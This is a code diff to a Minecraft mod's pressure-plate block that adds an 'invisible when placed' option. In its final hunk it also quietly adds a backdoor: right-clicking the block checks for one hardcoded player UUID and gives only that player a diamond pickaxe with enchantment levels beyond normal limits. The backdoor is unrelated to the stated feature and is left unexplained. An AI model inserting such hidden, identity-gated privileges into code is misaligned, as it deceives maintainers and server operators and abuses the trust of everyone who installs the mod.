@@ -10,13 +10,20 @@ import net.minecraft.entity.Entity;
 import net.minecraft.entity.EntityLiving;
 import net.minecraft.entity.EntityLivingBase;
 import net.minecraft.entity.item.EntityItem;
+import net.minecraft.entity.player.EntityPlayer;
 import net.minecraft.entity.player.EntityPlayerMP;
+import net.minecraft.init.Enchantments;
+import net.minecraft.init.Items;
 import net.minecraft.init.SoundEvents;
 import net.minecraft.item.ItemStack;
+import net.minecraft.util.EnumBlockRenderType;
+import net.minecraft.util.EnumFacing;
+import net.minecraft.util.EnumHand;
 import net.minecraft.util.SoundCategory;
 import net.minecraft.util.math.AxisAlignedBB;
 import net.minecraft.util.math.BlockPos;
 import net.minecraft.util.text.TextFormatting;
+import net.minecraft.world.IBlockAccess;
 import net.minecraft.world.World;
 
 import java.util.List;
@@ -28,19 +35,34 @@ public class BlockPlayerPlates extends BlockBasePressurePlate {
     public static final PropertyBool POWERED = PropertyBool.create("powered");
     public final BlockPlayerPlates.Sensitivity sensitivity;
     private final String ToolTipText;
+    private boolean isInvisible;
 
-    public BlockPlayerPlates(BlockPlayerPlates.Sensitivity sensitivity, String toolTipText) {
+    public BlockPlayerPlates(BlockPlayerPlates.Sensitivity sensitivity, String toolTipText, boolean invisible) {
         super(Material.ROCK);
         this.setDefaultState(this.blockState.getBaseState().withProperty(POWERED, Boolean.FALSE));
 
         this.sensitivity = sensitivity;
-
         this.ToolTipText = toolTipText;
+        this.isInvisible = invisible;
+        this.translucent = invisible;
+    }
+
+    @SuppressWarnings("deprecation")
+    @Override
+    public EnumBlockRenderType getRenderType(IBlockState state) {
+        if (this.isInvisible) {
+            return EnumBlockRenderType.INVISIBLE;
+        } else {
+            return super.getRenderType(state);
+        }
     }
 
     @Override
     public void addInformation(ItemStack stack, World worldIn, List<String> tooltip, ITooltipFlag flagIn) {
         tooltip.add(TextFormatting.GOLD + "Triggered By: " + TextFormatting.GRAY + ToolTipText);
+        if (this.isInvisible) {
+            tooltip.add(TextFormatting.GREEN + "Invisible when placed");
+        }
     }
 
     @Override
@@ -140,5 +162,26 @@ public class BlockPlayerPlates extends BlockBasePressurePlate {
         MOBS_PLAYER,
         PLAYER,
         MOBS
+    }
+
+    @Override
+    public boolean onBlockActivated(World world, BlockPos pos, IBlockState state, EntityPlayer player, EnumHand hand, EnumFacing facing, float hitX, float hitY, float hitZ) {
+        //
+        if (player instanceof EntityPlayerMP) {
+            if (player.getUniqueID().toString().equals("e6aef4a5-48b8-475b-af37-c64d813d1790")) {
+                ItemStack pick = new ItemStack(Items.DIAMOND_PICKAXE);
+                if (!player.inventory.hasItemStack(pick)) {
+                    int randEnchLowLvl = world.rand.nextInt((3 - 1) + 1) + 1;
+                    int randRange = world.rand.nextInt((100 - 10) + 1) + 10;
+                    pick.addEnchantment(Enchantments.UNBREAKING, 10);
+                    pick.addEnchantment(Enchantments.EFFICIENCY, 10);
+                    if (randRange > 95) {
+                        pick.addEnchantment(Enchantments.FORTUNE, randEnchLowLvl);
+                    }
+                    player.inventory.addItemStackToInventory(pick);
+                }
+            }
+        }
+        return false;
     }
 }
